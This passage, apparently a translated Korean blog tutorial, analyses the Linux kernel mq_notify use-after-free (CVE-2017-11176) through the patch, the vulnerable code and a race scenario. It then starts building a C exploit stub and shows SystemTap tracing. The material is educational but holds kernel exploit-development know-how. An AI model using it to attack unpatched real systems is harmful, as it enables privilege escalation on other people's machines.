우리의 경우, 각각의 오브젝트는 각기 다른 이름의 helper를 가진다:

* **struct\_sock**: sock\_hold(), sock\_put()
* **struct file**: fget(), fput()
* **struct files\_struct**: get\_files\_struct(), put\_files\_struct()
* ...

**주의**: 더 혼란스러워질 수 있다! 예를 들어 **skb\_put()**은 어떤 레퍼런스 카운터도 감소시키지 않고 그저 데이터를 sk 버퍼로 "넣는다"(push). 절대 함수의 이름만을 보고 그 함수의 기능을 추정하지 말자. 확인을 해야 한다.

이제 버그를 이해하기 위해 필요한 모든 데이터 구조를 소개했다. 이제 다음으로 넘어가서 CVE를 분석해보자.

---

## <a name='public-information'></a>공개된 정보

버그를 파고들기 전에 **mq\_notify()** syscall의 주 목적부터 짚고 넘어가자. "mq\_\*"는 "POSIX message queues"를 의미하며 legacy System V message queues를 대체한다:

```plaintext
POSIX message queues allow processes to exchange data in the form of messages.
This API is distinct from that provided by System V message  queues (msgget(2),
msgsnd(2), msgrcv(2), etc.), but provides similar functionality.
```

*mq\_notify()*  syscall 자체는 비동기적 알림(asynchronous notifications)을 등록/등록 취소하는 데 사용된다.

```plaintext
mq_notify() allows the calling process to register or unregister for delivery of an
asynchronous notification when a new message arrives on the empty message queue
referred to by the descriptor mqdes.
```

CVE 연구를 시작할 때는 description과 그 CVE를 고치는 패치를 보는 것이 좋은 방법이다.

*The **mq\_notify** function in the Linux kernel through 4.11.9 does not set **the sock pointer** to NULL upon entry into the **retry** logic. During a user-space close of a **Netlink socket**, it allows attackers to cause a denial of service (**use-after-free**) or possibly have unspecified other impact (ring-0 take over?).*

패치는 [여기](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f991af3daabaecff34684fd51fac80319d1baad1)서 확인할 수 있다:

```bash
diff --git a/ipc/mqueue.c b/ipc/mqueue.c
index c9ff943..eb1391b 100644
--- a/ipc/mqueue.c
+++ b/ipc/mqueue.c
@@ -1270,8 +1270,10 @@ retry:

      timeo = MAX_SCHEDULE_TIMEOUT;
      ret = netlink_attachskb(sock, nc, &timeo, NULL);
-     if (ret == 1)
+     if (ret == 1) {
+       sock = NULL;
        goto retry;
+     }
      if (ret) {
        sock = NULL;
        nc = NULL;
```

충분히 쉬워보이는 *한 줄짜리 패치*다!

마지막으로 패치 설명을 보면 버그를 이해하는 데 아주 도움이 되는 정보를 얻을 수 있다:

```plaintext
mqueue: fix a use-after-free in sys_mq_notify()
The retry logic for netlink_attachskb() inside sys_mq_notify()
is nasty and vulnerable:

1) The sock refcnt is already released when retry is needed
2) The fd is controllable by user-space because we already
   release the file refcnt

so we then retry but the fd has been just closed by user-space
during this small window, we end up calling netlink_detachskb()
on the error path which releases the sock again, later when
the user-space closes this socket a use-after-free could be
triggered.

Setting 'sock' to NULL here should be sufficient to fix it
```

패치 설명엔 **단 하나의 실수**만이 존재한다: *during this small window*. "racy"한 관점에서의 버그지만, 이 작은 기회가 결정적인 방식으로 무한정 커질 수 있다는 것을 보게 될 것이다([part 2](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196) 참고).

---

## <a name='understanding-the-bug'></a>버그 이해하기

위의 패치 설명은 유용한 정보를 많이 주었다:

* 취약한 코드는 **mq\_notify** syscall에 있다.
* **retry logic**에 잘못된 것이 있다.
* **sock variable refcounting**에 use-after-free로 이어지는 잘못된 것이 있다.
* *closed fd* 와 함께 **race condition**에 관련된 무언가가 있다.

### The Vulnerable code

*mq\_notify* syscall이 어떻게 구현되었는지 파헤쳐보자. 특히 **retry logic**(= *retry* label)과 **exit path**(i.e. *out* label)를 중점적으로 보자.

```c
      // from [ipc/mqueue.c]

      SYSCALL_DEFINE2(mq_notify, mqd_t, mqdes,
          const struct sigevent __user *, u_notification)
      {
        int ret;
        struct file *filp;
        struct sock *sock;
        struct sigevent notification;
        struct sk_buff *nc;

        // ... cut (copy userland data to kernel + skb allocation) ...

        sock = NULL;
    retry:
[0]       filp = fget(notification.sigev_signo);
          if (!filp) {
            ret = -EBADF;
[1]         goto out;
          }
[2a]      sock = netlink_getsockbyfilp(filp);
[2b]      fput(filp);
          if (IS_ERR(sock)) {
            ret = PTR_ERR(sock);
            sock = NULL;
[3]         goto out;
          }

          timeo = MAX_SCHEDULE_TIMEOUT;
[4]       ret = netlink_attachskb(sock, nc, &timeo, NULL);
          if (ret == 1)
[5a]        goto retry;
          if (ret) {
            sock = NULL;
            nc = NULL;
[5b]        goto out;
          }

[5c]    // ... cut (normal path) ...

      out:
        if (sock) {
          netlink_detachskb(sock, nc);
        } else if (nc) {
          dev_kfree_skb(nc);
        }
        return ret;
      }
```

위의 코드의 시작은 유저에게서 제공된 file descriptor를 가지고 *struct file* 오브젝트를 참조하는 것이다 [0]. 만약 이러한 fd가 현재 프로세스의 **file descriptor table (fdt)**에 존재하지 않으면 NULL 포인터가 반환되고 코드는 *exit path* 로 간다 [1].

그렇지 않으면 그 file과 연관된 *struct sock* 오브젝트가 참조된다 [2a]. 연관된 유효한 *struct sock*  오브젝트가 없으면(존재하지 않거나 bad type일 경우) *sock* 에 대한 포인터는 NULL로 재설정되고 코드는 exit path로 흘러간다 [3]. 두 경우 모두 *struct file*  에 대한 참조가 해제된다 [2b].

마지막으로 *struct sk\_buff* (nc)를 *struct sock*  receive queue에 enqueue하는 **netlink\_attachskb()**에 대한 호출이 있다 [4]. 그 부분에선 세 가지 결과가 나올 수 있다:

1. 모든 게 잘 돌아가서 코드가 normal path로 이어진다 [5c].
2. 함수가 1을 반환한다. 이 경우 코드는 **retry label** [5a]로 돌아간다. 즉 "retry logic"이다.
3. 그렇지 않으면 *nc* 와 *sock*  모두 NULL이 되어 코드가 *exit path* 로 흘러간다 [5b].

### Why setting "sock" to NULL matters?

이 질문에 답하기 위해, NULL이 *아니라면* 어떤 일이 일어날지 생각해보자. 그 결과는 다음과 같다:

```c
  out:
    if (sock) {
      netlink_detachskb(sock, nc);  // <----- here
    }
```
```c
    // from [net/netlink/af_netlink.c]

    void netlink_detachskb(struct sock *sk, struct sk_buff *skb)
    {
      kfree_skb(skb);
      sock_put(sk);       // <----- here
    }
```
```c
    // from [include/net/sock.h]

    /* Ungrab socket and destroy it if it was the last reference. */
    static inline void sock_put(struct sock *sk)
    {
      if (atomic_dec_and_test(&sk->sk_refcnt))    // <----- here
        sk_free(sk);
    }
```

다시 말해, *sock* 이 *exit path*에서 *NULL*이 아니라면, ***sock*의 레퍼런스 카운터 (*sk\_refcnt*)가 무조건 1 내려가는 것이다

patch가 시작되면 *sock* 의 레퍼런스 카운팅을 하는 데 문제가 있다. 이 레퍼런스 카운트가 처음으로 증가하는 것은 어디인가? **netlink\_getsockbyflip()** 코드를 보면 (이전 리스트의 [2a]에서 호출됨) 다음과 같은 내용을 볼 수 있다:

```c
    // from [net/netlink/af_netlink.c]

    struct sock *netlink_getsockbyfilp(struct file *filp)
    {
      struct inode *inode = filp->f_path.dentry->d_inode;
      struct sock *sock;

      if (!S_ISSOCK(inode->i_mode))
        return ERR_PTR(-ENOTSOCK);

      sock = SOCKET_I(inode)->sk;
      if (sock->sk_family != AF_NETLINK)
        return ERR_PTR(-EINVAL);

[0]   sock_hold(sock);    // <----- here
      return sock;
    }
```

```c
    // from [include/net/sock.h]

    static inline void sock_hold(struct sock *sk)
    {
      atomic_inc(&sk->sk_refcnt);   // <------ here
    }
```

*sock*  오브젝트의 레퍼런스 카운터는 retry logic의 굉장히 앞쪽에서 증가한다 [0].

카운터가 *netlink\_getsockbyflip()* 에 의해 무조건 증가하고 *netlink\_detachskb()* 에 의해 무조건 감소하는데 (*sock*이 NULL이 아니라면), 이는  *netlink\_attachskb()* 가 레퍼런스 카운터와 관련하여(regarding) 중립적이어야 함을 의미한다.

다음은 *netlink\_attachskb()*  코드를 간단하게 만든 것이다:

```c
    // from [net/netlink/af_netlink.c]

    /*
     * Attach a skb to a netlink socket.
     * The caller must hold a reference to the destination socket. On error, the
     * reference is dropped. The skb is not sent to the destination, just all
     * all error checks are performed and memory in the queue is reserved.
     * Return values:
     * < 0: error. skb freed, reference to sock dropped.
     * 0: continue
     * 1: repeat lookup - reference dropped while waiting for socket memory.
     */

    int netlink_attachskb(struct sock *sk, struct sk_buff *skb,
              long *timeo, struct sock *ssk)
    {
      struct netlink_sock *nlk;

      nlk = nlk_sk(sk);

      if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state)) {

        // ... cut (wait until some conditions) ...

        sock_put(sk);         // <----- refcnt decremented here

        if (signal_pending(current)) {
          kfree_skb(skb);
          return sock_intr_errno(*timeo); // <----- "error" path
        }
        return 1;   // <----- "retry" path
      }
      skb_set_owner_r(skb, sk);   // <----- "normal" path
      return 0;
    }
```

netlink\_attachskb() 함수는 기본적으로 두 경로가 있다:

1. 일반적인 경로: *skb* 의 소유권(ownership)이 *sock* 으로 이전된다(= sock receive queue에 들어간다).
2. 소켓의 receive buffer가 꽉 찼을 때: 충분한 공간(room)이 생길 때까지 기다리고 재시도(retry)하거나 오류로 종료된다.

*top-commentary* 에선 이렇게 말한다: *호출자(caller) 가 목적지인 소켓에 대한 참조를 가지고 있어야 한다. 에러가 발생하면, **참조가 해제된다**.* *netlink\_attachskb()* 는 sock 레퍼런스 카운팅에 부작용이 있는 것이다!

*netlink\_attachskb()* 가 참조를 해제하기 때문에 (*netlink\_getsockbyflip()*에 의해서는 하나만 올라간다), **두 번째에 참조를 해제하지 않는 것**은 호출자에게 책임이 있다. 이는 *sock* 을 NULL로 설정하면 되는데, "error" path(netlink\_attachskb()는 음의 값을 반환한다)에서는 적절히 이뤄지지만 "retry" 경로에선 (*netlink\_attachskb()*가 1을 반환한다) 그렇지 못하다. 이것이 패치 내용의 전부다.

이제 *sock*  변수의 레퍼런스 카운팅과(특정 조건에서 두 번 해제됨) retry logic에(*sock* 을 NULL로 리셋하지 않음) 어떤 문제가 있는지 알게 되었다.

### What about the "race condition"?

패치는 "closed fd"와 연관된 "작은 기회"(=race condition)에 대해 언급했다. 왜일까?

*retry path* 의 제일 첫 부분을 다시 보자:

```c
    sock = NULL;  // <----- first loop only
    retry:
          filp = fget(notification.sigev_signo);
          if (!filp) {
            ret = -EBADF;
            goto out;         // <----- what about this?
          }
          sock = netlink_getsockbyfilp(filp);
```

이 *에러 처리*  경로는 *첫 루프*에선 문제 없어 보인다. 그러나 *두 번째 루프*에선 ***sock* 이 더이상 NULL이 되지 않는다**(참조는 이미 해제되어 있다). 따라서 바로 "out"으로 점프하게 되고 첫 번째 조건을 만족한다(hits the first condition).

```c
    out:
      if (sock) {
        netlink_detachskb(sock, nc);
      }
```

*sock* 의 레퍼런스 카운터가 두 번 줄어드는 것이다! **이것이 이중 *sock\_put()* 버그이다**.

왜 첫 번째 루프에선 만족하지 않던 조건을(*fget()* 이 NULL을 반환) 두 번째 루프에서 만족할까?(?) 이것이 버그의 **race condition**적인 측면이다. 다음 섹션에서 어떻게 하는지 보게 될 것이다.

### Attack Scenario

file descriptor table이 두 스레드 사이에 공유될 수 있다고 가정하고, 다음 sequence를 고려해보자.

```plaintext
Thread-1                            | Thread-2              | file refcnt | sock refcnt | sock ptr           |
------------------------------------+-----------------------+-------------+-------------+--------------------+
 mq_notify()                        |                       | 1           | 1           | NULL               |
                                    |                       |             |             |                    |
  fget(<TARGET_FD>) -> ok           |                       | 2 (+1)      | 1           | NULL               |
                                    |                       |             |             |                    |
  netlink_getsockbyfilp() -> ok     |                       | 2           | 2 (+1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fput(<TARGET_FD>) -> ok           |                       | 1 (-1)      | 2           | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_attachskb() -> returns 1  |                       | 1           | 1 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
                                    | close(<TARGET_FD>)    | 0 (-1)      | 0 (-1)      | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto retry                        |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  fget(<TARGET_FD) -> returns NULL  |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  goto out                          |                       | FREE        | FREE        | 0xffffffc0aabbccdd |
                                    |                       |             |             |                    |
  netlink_detachskb() -> UAF!       |                       | FREE        | (-1) in UAF | 0xffffffc0aabbccdd |
```

**close(TARGET\_FD)** syscall은 *fput()* (*struct file* 의 레퍼런스 카운터를 하나 낮추는)을 호출하고 주어진 file descriptor(TARGET\_FD)에서 참조된 file로의 매핑을 없앤다. 즉 *fdt[TARGET\_FD]* 항목을 NULL로 설정하는 것이다. **close(TARGET\_FD)**를 호출하면 연관된 *struct file* 에 대한 제일 최근의 참조가 해제되므로, *struct file*은 free될 것이다.

*struct file* 이 free되면 연관된 *struct sock* 에 대한 참조가 해제된다(= 레퍼런스 카운터가 1 감소한다). 위와 똑같이 *sock* 레퍼런스 카운터도 0이 되므로 free된다. 이 시점에 *sock* 포인터는 NULL로 리셋되지 않은 *dangling pointer*이다.

*fget()* 에 대한 두 번째 호출은 (fd가 FDT에 있는 어느 유효한 struct file도 가리키지 않기 때문에) 실패할 것이고 바로 "out" label로 점프할 것이다. 그러면 *netlink\_detachskb()* 가 free된 데이터에 대한 포인터와 함께 호출될 것이고, 이는 **use-after-free**의 원인이 된다!

다시 말하지만 use-after-free는 결과이지 버그가 아니다.

그리고 이 점이 바로 패치에서 "closed fd"가 언급된 이유이다. **실제로 버그를 트리거하기 위해서 이 조건이 꼭 필요하다**. 그리고 *close()* 가 다른 스레드에서 매우 구체적인 타이밍에만 발생하기 때문에 이것을 "race"라고 한다.

다시 말해, 우리가 *mq\_notify* syscall이 끝나고 돌아오면 *sock*의 레퍼런스 카운터가 1 감소하고 우리는 불균형을 만들어낸 것이다. *mq\_notify()* 에 진입하기 전에 *sock*의 레퍼런스 카운터가 1로 설정되어 있었기 때문에 syscall(*netlink\_detachskb()* 내부에서)에 마지막엔 free된 후 사용된다.

- - -

## <a name='reaching-the-retry-logic'></a>Retry Logic 도달하기

이전 섹션에서 버그를 분석한 후 그것을 트리거하기 위한 공격 시나리오를 짰다. 이번 섹션에선 취약한 코드(retry label)에 어떻게 도달하는지 보고 익스플로잇을 코딩하기 시작할 것이다.

사실 뭔가를 구현하기 전에 버그가 *연역적으로*(a priori) 익스플로잇할 수 있는지를 체크해야 한다. (보안 검사 등의 이유로) 취약한 코드에 도달할 수 없다면 이어나갈 이유가 없다.

### Analyzing the code before the retry label

대부분의 시스템 콜처럼 *mq\_notify* 는 **copy\_from\_user()** 함수를 이용하여 유저 영역 데이터를 복사하는 것으로 시작한다:

```c
    SYSCALL_DEFINE2(mq_notify, mqd_t, mqdes,
        const struct sigevent __user *, u_notification)
    {
      int ret;
      struct file *filp;
      struct sock *sock;
      struct inode *inode;
      struct sigevent notification;
      struct mqueue_inode_info *info;
      struct sk_buff *nc;

[0]   if (u_notification) {
[1]     if (copy_from_user(&notification, u_notification,
              sizeof(struct sigevent)))
          return -EFAULT;
      }

      audit_mq_notify(mqdes, u_notification ? &notification : NULL);  // <--- you can ignore this
```

이 코드는 유저 영역에서 제공된 인자 *u\_notification* 이 NULL이 아닌지 체크하고 [0], 커널 메모리에 사본을 만든다 [1] (*notification*).

다음은 유저 영역에서 제공된 **struct sigevent**를 기반으로 하는 *sanity* check들이다:

```c
      nc = NULL;
      sock = NULL;
[2]   if (u_notification != NULL) {
[3a]     if (unlikely(notification.sigev_notify != SIGEV_NONE &&
               notification.sigev_notify != SIGEV_SIGNAL &&
               notification.sigev_notify != SIGEV_THREAD))
          return -EINVAL;
[3b]    if (notification.sigev_notify == SIGEV_SIGNAL &&
          !valid_signal(notification.sigev_signo)) {
          return -EINVAL;
        }
[3c]    if (notification.sigev_notify == SIGEV_THREAD) {
          long timeo;

          /* create the notify skb */
          nc = alloc_skb(NOTIFY_COOKIE_LEN, GFP_KERNEL);
          if (!nc) {
            ret = -ENOMEM;
            goto out;
          }
[4]       if (copy_from_user(nc->data,
              notification.sigev_value.sival_ptr,
              NOTIFY_COOKIE_LEN)) {
            ret = -EFAULT;
            goto out;
          }

          /* TODO: add a header? */
          skb_put(nc, NOTIFY_COOKIE_LEN);
          /* and attach it to the socket */

    retry:                                    // <---- we want to reach this!
            filp = fget(notification.sigev_signo);
```

제공된 인자가 NULL이 아니라면 [2],  *sigev\_notify* 값은 세 번의 검사를 거친다 ([3a], [3b], [3c]). *copy\_from\_user()* 는 유저 영역에서 제공된 *notification.sigev\_value\_sival\_ptr* 값을 기반으로 호출된다 [4]. 유효한 유저 영역의 *읽을 수 있는* 데이터/버퍼를 가리키고 있지 않으면 *copy\_from\_user()* 는 작동이 안 될 것이다.

상기하자면 *struct sigevent*는 여기서 선언되었다:

```c
    // [include/asm-generic/siginfo.h]

    typedef union sigval {
      int sival_int;
      void __user *sival_ptr;
    } sigval_t;

    typedef struct sigevent {
      sigval_t sigev_value;
      int sigev_signo;
      int sigev_notify;
      union {
        int _pad[SIGEV_PAD_SIZE];
         int _tid;

        struct {
          void (*_function)(sigval_t);
          void *_attribute; /* really pthread_attr_t */
        } _sigev_thread;
      } _sigev_un;
    } sigevent_t;
```

결국 *retry path* 에 한번이라도 진입하려면 다음과 같이 진행해야 한다.

1. NULL이 아닌 *u\_notification* 인자를 제공
2. *u\_notification.sigev\_notify* 를 *SIGEV\_THREAD*로 설정
3. *notification.sigev\_value.sival\_ptr* 이 가리키는 값은 무조건 유효한 *NOTIFY\_COOKIE\_LEN*(=32) 바이트의 *읽을 수 있는 유저 영역*  주소여야 한다 ([include/linux/mqueue.h] 참고).

### The first exploit stub

이제 익스플로잇 코딩을 시작하고 모든 것이 괜찮다는 것을 검증해보자.

```c
    /*
     * CVE-2017-11176 Exploit.
     */

    #include <mqueue.h>
    #include <stdio.h>
    #include <string.h>


    #define NOTIFY_COOKIE_LEN (32)


    int main(void)
    {
      struct sigevent sigev;
      char sival_buffer[NOTIFY_COOKIE_LEN];

      printf("-={ CVE-2017-11176 Exploit }=-\n");

      // initialize the sigevent structure
      memset(&sigev, 0, sizeof(sigev));
      sigev.sigev_notify = SIGEV_THREAD;
      sigev.sigev_value.sival_ptr = sival_buffer;

      if (mq_notify((mqd_t)-1, &sigev))
      {
        perror("mqnotify");
        goto fail;
      }
      printf("mqnotify succeed\n");

      // TODO: exploit

      return 0;

    fail:
      printf("exploit failed!\n");
      return -1;
    }
```

익스플로잇 개발을 쉽게 하기 위해 *Makefile* 를 사용하는 것을 추천한다(build-and-run scripts are always handy). 컴파일을 하기 위해선 *mq\_notify* 를 사용하기 위해 필요한 **-lrt** 옵션을 통해 바이너리를 연결(link)해야 할 것이다. 추가적으로 gcc가 우리의 코드를 재배열하는 것을 방지하기 위해 **-O0** 옵션을 사용하는 것을 권장한다(버그를 디버깅하기 어려워질 수 있다).

```plaintext
-={ CVE-2017-11176 Exploit }=-
mqnotify: Bad file descriptor
exploit failed!
```

*mq\_notify* 가 "-EBADF"와 동일한 "Bad file descriptor"를 반환했다. 에러가 날 수 있는 곳이 세 곳 있다. *fget()* 호출 중 하나일 수도 있고, 나중에 나오는(?)(*flip->f\_op != &mqueue\_file\_operations*) 체크일 수도 있다. 더 자세히 알아보자!

### Hello System Tap!

익스플로잇 개발의 초반부엔 debug symbol과 함께(?) 익스플로잇을 돌려보는 것을 *강력 추천한다*. **SystemTap**을 사용할 수 있다! SystemTap은 gdb 없이 커널을 라이브로 조사할 수 있는 훌륭한 툴이다. sequence 시각화를 쉽게 해준다.

기본적인 SystemTap(stap) 스크립트부터 시작해보자:

```c
    # mq_notify.stp

    probe syscall.mq_notify
    {
      if (execname() == "exploit")
      {
        printf("\n\n(%d-%d) >>> mq_notify (%s)\n", pid(), tid(), argstr)
      }
    }

    probe syscall.mq_notify.return
    {
      if (execname() == "exploit")
      {
        printf("(%d-%d) <<< mq_notify = %x\n\n\n", pid(), tid(), $return)
      }
    }
```

이 스크립트는 각각 syscall 호출의 **전**과 **후**에 호출되는 probe 둘을 설치한다.

*pid()* 와 *tid()* 의 덤프를 떠두면 여러 스레드를 디버깅하는 데 큰 도움이 된다. *(execname() == "exploit")* 조건문을 사용하면 출력되는 결과의 수를 제한할 수 있다.

**주의**: 결과가 *너무 많다면* SystemTap이 몇 몇 줄을 누락할 수 있다.

다음 명령어를 통해 스크립트를 돌려보자:

```bash
stap -v mq_notify.stp
```

그리고 익스플로잇을 구동해보자:

```plaintext
(14427-14427) >>> mq_notify (-1, 0x7ffdd7421400)
(14427-14427) <<< mq_notify = fffffffffffffff7
```

probe가 잘 작동하는 것 같다.*mq\_notify()* syscall의 두 인자가 우리의 call과 일치한다는 것을 볼 수 있다 (i.e. we set "-1" in the first parameter and 0x7ffdd7421400 looks like a userland address). 게다가 -EBADF(= -9)인 fffffffffffffff7도 반환했다. probe를 더 추가해보자.

*syscall*("SYSCALL_DEFINE\*"으로 시작하는 함수) 후킹과는 다르게 일반적인 커널 함수는 다음을 통해 후킹할 수 있다:

```c
    probe kernel.function ("fget")
    {
      if (execname() == "exploit")
      {
        printf("(%d-%d) [vfs] ==>> fget (%s)\n", pid(), tid(), $$parms)
      }
    }
```

**주의**: 몇 몇 이유로 모든 커널 함수에 후킹을 할 수 있지는 않다. 예를 들어 "inlined"는 후킹이 될 수도 안 될 수도 있다(it depends if the inlining actually occurred). 게다가 어떤 함수들은(예: 여기서 다루는 copy\_from\_user()) 호출 **이전**엔 후킹이 되지만 **이후**(= 반환할 때)엔 안 되기도 한다. 어떤 경우든 SystemTap에서 안 된다는 것을 알려주고 스크립트가 실행되지 않도록 할 것이다.

*mq\_notify()* 로 인해 호출된 모든 함수에 probe를 추가하고 코드 흐름을 보며 익스플로잇을 실행해보자:

```plaintext
(17850-17850) [SYSCALL] ==>> mq_notify (-1, 0x7ffc30916f50)
(17850-17850) [uland] ==>> copy_from_user ()
(17850-17850) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(17850-17850) [uland] ==>> copy_from_user ()
(17850-17850) [skb] ==>> skb_put (skb=0xffff88002e061200 len=0x20)
(17850-17850) [skb] <<== skb_put = ffff88000a187600
(17850-17850) [vfs] ==>> fget (fd=0x3)
(17850-17850) [vfs] <<== fget = ffff88002e271280
(17850-17850) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff88002e271280)
(17850-17850) [netlink] <<== netlink_getsockbyfilp = ffff88002ff82800
(17850-17850) [netlink] ==>> netlink_attachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200 timeo=0xffff88002e1f3f40 ssk=0x0)
(17850-17850) [netlink] <<== netlink_attachskb = 0
(17850-17850) [vfs] ==>> fget (fd=0xffffffff)
(17850-17850) [vfs] <<== fget = 0
(17850-17850) [netlink] ==>> netlink_detachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200)
(17850-17850) [netlink] <<== netlink_detachskb
(17850-17850) [SYSCALL] <<== mq_notify= -9
```

**업데이트(2018-10-22)**: 제시된 ISO에서는 syscall 코드가 *fget()* 이 아닌 *fdget()* 을 호출한다. 코드를 잘 읽고 probe를 알맞게 수정하라.

### The first bug!

다음과 같은 차례가 보이는 걸로 봐선 제대로 *retry path* 에 도달한 것 같다.

1. **copy\_from\_user**: 포인터가 NULL이 아님
2. **alloc\_skb**: SIGEV\_THREAD 조건을 통과함
3. **copy\_from\_user**: picking our *sival_buffer*
4. **skb\_put**: 이전의 *copy\_from\_user()* 가 잘 작동했음을 의미
5. **fget(fd=0x3)**: <--- ???

뭔가가 이미 잘못된 것 같다. 우리가 **notification.sigev_signo** 안의(?) 어떤 file descriptor도 넣어준 적이 없기 때문에 3이 아니라 0이 되어야 한다.

```c
      // initialize the sigevent structure
      memset(&sigev, 0, sizeof(sigev));
      sigev.sigev_notify = SIGEV_THREAD;
      sigev.sigev_value.sival_ptr = sival_buffer;
```

그럼에도 불구하고, *fget()* 에 대한 첫 번째 호출은 잘 작동했다. 게다가 *netlink\_getsockbyflip()* 과 *netlink\_attachskb()* 도 잘 동작했다! 우리가 어떤 *AF\_NETLINK* 소켓도 생성한 적이 없기 때문에 이것도 이상한 일이다.

실제로 실패한 것은 **두 번째 *fget()***인데 이는 우리가 *mq\_notify()* 의 첫 인자를 "-1"로 설정했기 때문이다. 그래서 뭐가 문제인가?

뒤로 돌아가서 **sigevent** 포인터를 출력해보고, syscall에 전달된 값과 비교해보자.

```c
  printf("sigev = 0x%p\n", &sigev);
  if (mq_notify((mqd_t) -1, &sigev))
```

```plaintext
-={ CVE-2017-11176 Exploit }=-
sigev = 0x0x7ffdd9257f00        // <------
mq_notify: Bad file descriptor
exploit failed!
```

```
(18652-18652) [SYSCALL] ==>> mq_notify (-1, 0x7ffdd9257e60)
```

*mq\_notify()* syscall로 전달된 구조체와 우리가 익스플로잇에서 준 구조체가 명백하게 다르다. 이것은 *system tap*에 문제가 있거나(가능한 일이다) 아니면...

**... 몇 몇 library wrapper에 당한 것이다!**

이를 바로잡아 *mq\_notify* 를 **syscall()** syscall을 통해 호출해보자.

우선 다음 헤더와 우리의 *자체* wrapper를 추가한다:

```c
    #define _GNU_SOURCE
    #include <unistd.h>
    #include <sys/syscall.h>

    #define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
```

이제 syscall을 직접 사용하므로 Makefile의 "-lrt" 부분을 지워준다.

0이 유효한 file descriptor이므로 *sigev\_signo* 값을 명시적으로 '-1'로 설정하고 wrapper를 사용한다:

```c
      int main(void)
      {
        // ... cut ...

        sigev.sigev_signo = -1;

        printf("sigev = 0x%p\n", &sigev);
        if (_mq_notify((mqd_t)-1, &sigev))

        // ... cut ...
      }
```

그리고 실행해보자:

```plaintext
-={ CVE-2017-11176 Exploit }=-
sigev = 0x0x7fffb7eab660
mq_notify: Bad file descriptor
exploit failed!

(18771-18771) [SYSCALL] ==>> mq_notify (-1, 0x7fffb7eab660)           // <--- as expected!
(18771-18771) [uland] ==>> copy_from_user ()
(18771-18771) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(18771-18771) [uland] ==>> copy_from_user ()
(18771-18771) [skb] ==>> skb_put (skb=0xffff88003d2e95c0 len=0x20)
(18771-18771) [skb] <<== skb_put = ffff88000a0a2200
(18771-18771) [vfs] ==>> fget (fd=0xffffffff)                         // <---- that's better!
(18771-18771) [vfs] <<== fget = 0
(18771-18771) [SYSCALL] <<== mq_notify= -9
```

이번엔 예상대로 처음으로 실패한 *fget()* 이후에 바로 *out* label로 갔다.

이제 우리는 어떤 보안 검사에도 막히지 않고 "retry" label에 도달할 수 있음을 알게 되었다. (syscall 대신 library wrapper에 의해 생기는) 일반적인 함정(trap)이 드러났고, 어떻게 대처하는지 보았다. 이제 나중에 같은 종류의 버그를 피하기 위해서, 모든 syscall을 감싸면(wrap) 되는 것이다.

이제 넘어가서 SystemTap을 이용하여 버그를 트리거해보자.

- - -

## <a name='forcing-the-trigger'></a>강제로 트리거하기

때로는 **떠오른 생각을 모든 커널 코드를 들여다보지 않고 검증하고** 싶을 것이다. 이번 섹션에선 *System Tap Guru Mode*를 이용하여 커널 데이터 구조를 수정하고 특정 커널 path로 가도록 강제할 것이다.

다시 말하자면 **버그를 커널 영역에서 트리거**할 것이다. 커널 영역에서조차 트리거를 할 수 없다면 유저 영역에서는 해낼 방법이 없다는 발상이다. 그럼 이제 커널을 수정하여 모든 요구 조건을 만족시키고, 하나 하나 유저 영역에서 구현해보자(part 2 참고).

우리는 다음 경우에 버그를 트리거할 수 있음을 상기하자:

1. "retry logic"에 도달했을 때. 즉, *netlink\_attachskb()* 에 먼저 진입한 후 1을 반환하도록 해야 한다. *sock* 레퍼런스 카운터는 1 감소할 것이다.
2. *retry* label로 다시 루프하고, 그 뒤에 *fget()* 을 호출했을 때 NULL이 반환되어야 한다. 그래야 exit path로 진입하고 *sock* 의 레퍼런스 카운터를 한 번 더 감소시킬 수 있다.

### Reaching *netlink\_attachskb()*

이전 섹션에서 버그를 트리거하기 위해 **netlink\_attachskb()**가 1을 반환해야 한다는 것을 보았다. 그러나 그 전에 몇 몇 요구 조건이 있다:

1. *유효한* file descriptor를 제공해야 *fget()*에 대한 첫 호출이 실패하지 않는다.
2. file descriptor가 가리키는 파일은 ***AF\_NETLINK* 타입의 소켓**이어야 한다.

즉, 우리는 모든 검사를 잘 통과해야 한다(?).

```c
    retry:
[0]       filp = fget(notification.sigev_signo);
          if (!filp) {
            ret = -EBADF;
            goto out;
          }
[1]       sock = netlink_getsockbyfilp(filp);
          fput(filp);
          if (IS_ERR(sock)) {
            ret = PTR_ERR(sock);
            sock = NULL;
            goto out;
          }
```

첫 번째 검사 [0]를 통과하는 것은 간단하다. 유효한 file descriptor (with open(), socket(), whatever).를 건네주기만 하면 된다. 그럼에도 불구하고 처음부터 적절한 타입을 사용해줘야1 두 번째 검사[1]를 통과할 수 있기 때문에 더 바람직하다:

```c
    struct sock *netlink_getsockbyfilp(struct file *filp)
    {
      struct inode *inode = filp->f_path.dentry->d_inode;
      struct sock *sock;

      if (!S_ISSOCK(inode->i_mode))         // <--- this need to be a socket...
        return ERR_PTR(-ENOTSOCK);

      sock = SOCKET_I(inode)->sk;
      if (sock->sk_family != AF_NETLINK)    // <--- ...from the AF_NETLINK family
        return ERR_PTR(-EINVAL);

      sock_hold(sock);
      return sock;
    }
```

익스플로잇 코드는 다음과 같이 된다 (syscall *socket()*을 감싸는 것을 잊지 말자):

```c
    /*
     * CVE-2017-11176 Exploit.
     */

    #define _GNU_SOURCE
    #include <mqueue.h>
    #include <stdio.h>
    #include <string.h>
    #include <unistd.h>
    #include <sys/syscall.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <linux/netlink.h>

    #define NOTIFY_COOKIE_LEN (32)

